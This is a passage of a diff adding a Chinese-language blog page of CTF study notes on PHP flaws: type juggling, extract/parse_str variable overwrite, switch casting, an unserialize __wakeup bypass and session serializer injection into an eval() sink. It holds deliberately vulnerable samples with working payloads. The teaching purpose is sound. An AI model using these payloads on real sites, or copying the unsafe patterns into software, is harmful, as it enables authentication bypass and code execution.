+    <span class="nb">var_dump</span><span class="p">(</span><span class="nb">strval</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$number_2</span><span class="p">)));</span> <span class="c1">// 1</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="s2">&quot;\f1&quot;</span> <span class="o">==</span> <span class="s2">&quot;1&quot;</span><span class="p">);</span> <span class="c1">// true</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<h3>in_array() 函数缺陷</h3>
+<p>in_array()函数用来判断字符串是否存在与数组中，但是在判断的时候，会进行类型强制转换，就会出现数字比较的情况。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$array</span><span class="o">=</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">];</span>  
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">));</span> <span class="c1">// true</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s1">&#39;1bc&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">));</span> <span class="c1">// true</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<h3>strpos() 函数缺陷</h3>
+<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。
+经典题目：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">],</span><span class="s1">&#39;abc&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">){</span>
+    <span class="k">echo</span> <span class="s1">&#39;123&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s1">&#39;456&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>传入abc或会打印123，但是传入一个数组或者不传入数据一样也会打印123。这个函数也是只解析string类型的字符串，给他个数组就不知道如何解析，于是就返回为null。Null==0！当不传入数据的时候，也是一样的道理，还是返回null。</p>
+<h3>变量覆盖</h3>
+<h4>extract() 函数覆盖</h4>
+<div class="highlight"><pre><span></span><span class="x">extract() 函数从数组中将变量导入到当前的符号表。</span>
+
+<span class="x">该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</span>
+<span class="x">EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</span>
+<span class="x">EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</span>
+<span class="x">EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</span>
+<span class="x">EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。</span>
+<span class="x">EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。</span>
+<span class="x">EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</span>
+<span class="x">EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</span>
+<span class="x">EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</span>
+<span class="x">这个函数的重点就是默认将已经有的变量给覆盖掉</span>
+</pre></div>
+
+
+<p>🌰</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+  <span class="nv">$auth</span> <span class="o">=</span> <span class="s1">&#39;yaun&#39;</span><span class="p">;</span>  
+    <span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span> 
+    <span class="k">if</span><span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>  
+        <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>  
+    <span class="p">}</span> <span class="k">else</span><span class="p">{</span>  
+        <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>  
+    <span class="p">}</span>  
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">参数：auth=1</span>
+
+<span class="x">  将之前的auth变量覆盖了</span>
+</pre></div>
+
+
+<h4>parse_str() 函数导致覆盖变量</h4>
+<p>parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 极度不建议 在没有 array参数的情况下使用此函数，并且在 PHP 7.2 中将废弃不设置参数的行为。此函数没有返回值。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])){</span>
+    <span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="s2">&quot;http://blog.51cto.com/12332766&quot;</span><span class="p">;</span>
+    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+    <span class="o">@</span><span class="nb">parse_str</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;yaun&#39;</span><span class="p">){</span>
+        <span class="k">echo</span> <span class="s2">&quot;yes is flag&quot;</span><span class="p">;</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;其实很简单，其实并不难&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">payload:id=a[]=yaun</span>
+</pre></div>
+
+
+<p>没看懂底下。。。。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+   <span class="k">include</span> <span class="nx">“flag</span><span class="o">.</span><span class="nx">php”</span><span class="p">;</span>
+
+   <span class="nv">$_403</span> <span class="o">=</span> <span class="nx">“Access</span> <span class="nx">Denied”</span><span class="p">;</span>
+
+   <span class="nv">$_200</span> <span class="o">=</span> <span class="nx">“Welcome</span> <span class="nx">Admin”</span><span class="p">;</span>
+
+   <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="p">]</span> <span class="o">!=</span> <span class="nx">“POST”</span><span class="p">)</span>
+   <span class="p">{</span>
+         <span class="k">die</span><span class="p">(</span><span class="nx">“BugsBunnyCTF</span> <span class="nx">is</span> <span class="nx">here</span> <span class="o">:</span><span class="nx">p…”</span><span class="p">);</span>
+   <span class="p">}</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;flag&quot;</span><span class="p">])</span> <span class="p">)</span>
+   <span class="p">{</span>
+         <span class="k">die</span><span class="p">(</span><span class="nv">$_403</span><span class="p">);</span>
+   <span class="p">}</span>
+   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
+   <span class="p">{</span>
+         <span class="nv">$$key</span> <span class="o">=</span> <span class="nv">$$value</span><span class="p">;</span>
+   <span class="p">}</span>
+   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
+   <span class="p">{</span>
+         <span class="nv">$$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+   <span class="p">}</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;flag&quot;</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$flag</span> <span class="p">)</span>
+   <span class="p">{</span>
+         <span class="k">die</span><span class="p">(</span><span class="nv">$_403</span><span class="p">);</span>
+   <span class="p">}</span>
+   <span class="k">echo</span> <span class="nx">“This</span> <span class="nx">is</span> <span class="nx">your</span> <span class="nx">flag</span> <span class="o">:</span> <span class="nx">“</span><span class="o">.</span> <span class="nv">$flag</span> <span class="o">.</span> <span class="nx">“\n”</span><span class="p">;</span>
+   <span class="k">die</span><span class="p">(</span><span class="nv">$_200</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">  Get方法传输：_200=flag</span>
+<span class="x">  Post方法传输：flag=abcde</span>
+</pre></div>
+
+
+<h4>json_decode 函数</h4>
+<div class="highlight"><pre><span></span><span class="nx">对象表示为键值对</span>
+<span class="nx">数据由逗号分隔</span>
+<span class="nx">花括号保存对象</span>
+<span class="nx">方括号保存数组</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]);</span>
+    <span class="nv">$key</span> <span class="o">=</span><span class="s2">&quot;*********&quot;</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$message</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;flag&quot;</span><span class="p">;</span>
+    <span class="p">}</span> 
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;fail&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+ <span class="p">}</span>
+ <span class="k">else</span><span class="p">{</span>
+     <span class="k">echo</span> <span class="s2">&quot;~~~~&quot;</span><span class="p">;</span>
+ <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">payload: message={&quot;key&quot;:0}</span>
+</pre></div>
+
+
+<h3>switch() 函数漏洞</h3>
+<p>switch函数是php中的条件分支语句，通过对switch中的参数值进行判断，选择case中的代码去执行，但是会将switch中的参数转换为int类型，那么问题就来了，在进行类型转换的时候，’1admin’==’1’的。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$i</span> <span class="o">=</span><span class="s2">&quot;2abc&quot;</span><span class="p">;</span>  
+<span class="k">switch</span> <span class="p">(</span><span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>  
+<span class="k">case</span> <span class="mi">0</span><span class="o">:</span>  
+<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>  
+<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>  
+<span class="k">echo</span> <span class="s2">&quot;i is less than 3 but not negative&quot;</span><span class="p">;</span>  
+<span class="k">break</span><span class="p">;</span>  
+<span class="k">case</span> <span class="mi">3</span><span class="o">:</span>  
+<span class="k">echo</span> <span class="s2">&quot;i is 3&quot;</span><span class="p">;</span>  
+<span class="p">}</span> 
+<span class="c1">// 输出了 i is less than 3 but not negative</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>另类</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+ <span class="k">switch</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+    <span class="k">case</span> <span class="nv">$a</span><span class="o">&gt;=</span><span class="mi">0</span><span class="o">:</span> <span class="k">echo</span> <span class="mi">0</span><span class="p">;</span><span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="nv">$a</span><span class="o">&gt;=</span><span class="mi">10</span><span class="o">:</span><span class="k">echo</span> <span class="mi">1</span><span class="p">;</span><span class="k">break</span><span class="p">;</span> <span class="c1">// 输出1</span>
+    <span class="k">default</span><span class="o">:</span> <span class="k">echo</span> <span class="mi">2</span><span class="p">;</span><span class="k">break</span><span class="p">;</span>    
+ <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="x">第一个分支判断语句，并不会成立，因为case的条件是 0&gt;=0 ，也就是 true ，但是参数$a为0，两者并不相等，但是第二个分支语句的case条件为 0&gt;=10 ，也就是false，参数$a的值为0，’0’==’false’,所以case $a&gt;=10成立。</span>
+</pre></div>
+
+
+<h3>serialize and unserialize 漏洞</h3>
+<h4>序列化和反序列化介绍</h4>
+<p>serialize ：把复杂的数据结构压缩到一个字符串中</p>
+<p>unserialize：把被压缩的数据还原</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$test1</span> <span class="o">=</span> <span class="s2">&quot;hello world&quot;</span><span class="p">;</span>
+<span class="nv">$test2</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;hello&quot;</span><span class="p">,</span><span class="s2">&quot;world&quot;</span><span class="p">);</span>
+<span class="nv">$test3</span> <span class="o">=</span> <span class="mi">123456</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$test1</span><span class="p">);</span> <span class="c1">//  s:11:&quot;hello world&quot;;  序列化字符串</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$test2</span><span class="p">);</span> <span class="c1">// a:2:{i:0;s:5:&quot;hello&quot;;i:1;s:5:&quot;world&quot;;} 序列化数组</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$test3</span><span class="p">);</span> <span class="c1">//  i:123456;  </span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">a:2:</span>
+
+<span class="x">o表示对象</span>
+
+<span class="x">a表示数组</span>
+
+<span class="x">s表示字符</span>
+
+<span class="x">i表示数字</span>
+
+<span class="x">2表示个数</span>
+
+<span class="x">  对象（object）通常被序列化为：</span>
+<span class="x">O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:{&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;...&lt;field name n&gt;&lt;field value n&gt;}</span>
+
+
+<span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$test1</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$test2</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$test3</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span> 
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">//  O:4:&quot;test&quot;:3:{s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;}</span>
+</pre></div>
+
+
+<p>🌰</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
+    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+    <span class="k">class</span> <span class="nc">sercet</span><span class="p">{</span> 
+        <span class="k">private</span> <span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">;</span> 
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span> 
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span> 
+        <span class="p">}</span> 
+        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span> 
+            <span class="k">echo</span> <span class="nb">show_source</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="k">true</span><span class="p">);</span> 
+        <span class="p">}</span> 
+        <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span> 
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">;</span> 
+        <span class="p">}</span> 
+    <span class="p">}</span>   
+    <span class="nv">$cmd</span><span class="o">=</span><span class="nx">cmd00</span><span class="p">;</span> 
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$cmd</span><span class="p">])){</span> 
+        <span class="k">echo</span> <span class="nb">show_source</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">,</span><span class="k">true</span><span class="p">);</span> 
+    <span class="p">}</span> 
+    <span class="k">else</span><span class="p">{</span> 
+        <span class="nv">$cmd</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$cmd</span><span class="p">]);</span> 
+        <span class="k">if</span> <span class="p">((</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[oc]:\d+:/i&#39;</span><span class="p">,</span><span class="nv">$cmd</span><span class="p">))</span><span class="o">||</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/flag/i&#39;</span><span class="p">,</span><span class="nv">$cmd</span><span class="p">))){</span> 
+            <span class="k">echo</span> <span class="s2">&quot;Are u gaoshing?&quot;</span><span class="p">;</span> 
+        <span class="p">}</span> 
+        <span class="k">else</span><span class="p">{</span> 
+            <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> 
+        <span class="p">}</span> 
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"> </span>
+<span class="x">//sercet in the_next.php</span>
+
+<span class="x">  绕过正则可以用+号 绕过 __weakup 当成员属性数目大于实际数目时可绕过 wakeup</span>
+<span class="x">  payload:O:+6:&quot;sercet&quot;:2:{S:12:&quot;\00sercet\00file&quot;;s:12:&quot;the_next.php&quot;;}  TzorNjoic2VyY2V0IjoyOntTOjEyOiJcMDBzZXJjZXRcMDBmaWxlIjtzOjEyOiJ0aGVfbmV4dC5waHAiO30KCgo=</span>
+</pre></div>
+
+
+<h3>session反序列化漏洞</h3>
+<p>Ini_set 设置php.ini 中的值，在函数结束后设置失效。</p>
+<div class="highlight"><pre><span></span><span class="x">ini_set(‘session.serialize_handler’, ‘php_serialize’);</span>
+<span class="x">ini_set(‘session.serialize_handler’, ‘php’);</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span><span class="c1">//a:1:{s:6:&quot;spoock&quot;;s:3:&quot;111&quot;;}</span>
+<span class="c1">//ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);//spoock|s:3:&quot;111&quot;</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;spoock&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;a&quot;</span><span class="p">];</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">spoock|s:3:&quot;111&quot;;    // session 键值|内容序列化</span>
+<span class="x">a:1:{s:6:&quot;spoock&quot;;s:3:&quot;111&quot;;}a:1:{s:N:session 键值;内容序列化}</span>
+<span class="x">在ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);中把 | 之前认为是键值后面的视为序列化</span>
+</pre></div>
+
+
+<p>1.php</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;spoock&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;a&quot;</span><span class="p">];</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>2.php</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+   <span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">class</span> <span class="nc">lemon</span> <span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$hi</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hi</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+         <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hi</span><span class="p">);</span><span class="c1">//这里很危险，可以执行用户输入的参数</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>payload</p>
+<div class="highlight"><pre><span></span><span class="x">在1.php中输入</span>
+<span class="x">|O:5:”lemon”:1:{s:2:”hi”;s:10:”phpinfo();”;}</span>
+<span class="x">被序列化为</span>
+<span class="x">a:1:{s:6:”spoock”;s:44:”|O:5:”lemon”:1:{s:2:”hi”;s:10:”phpinfo();”;}</span>
+<span class="x">在2.php中，ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;) 会认为|后面的是序列化，然后就可以执行phpinfo()</span>
+</pre></div>
+
+
+        
+    </div>
+        <!-- /Content --> 
+
+        <!-- Footer -->
+        <div class="footer gradient-2">
+            <div class="container footer-container ">
+                <div class="row">
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Sitemap</div>
+                        <ul class="list-unstyled">
+                            <li><a href="/archives.html">Archives</a></li>
+                            <li><a href="/tags.html">Tags</a></li>
+                            <li><a href="/authors.html">Authors</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Social</div>
+                        <ul class="list-unstyled">
+                            <li><a href="#" target="_blank">You can add links in your config file</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Links</div>
+                        <ul class="list-unstyled">
+                            <li><a href="http://getpelican.com/" target="_blank">Pelican</a></li>
+                            <li><a href="http://python.org/" target="_blank">Python.org</a></li>
+                            <li><a href="http://jinja.pocoo.org/" target="_blank">Jinja2</a></li>
+                        </ul>
+                    </div> 
+                    <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3">
+                        <p class="pull-right text-right">
+                            <small><em>Proudly powered by <a href="http://docs.getpelican.com/" target="_blank">pelican</a></em></small><br/>
+                            <small><em>Theme and code by <a href="https://github.com/molivier" target="_blank">molivier</a></em></small><br/>
+                            <small>&copy; blogname 2015</small>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /Footer -->
+    </body>
+</html>
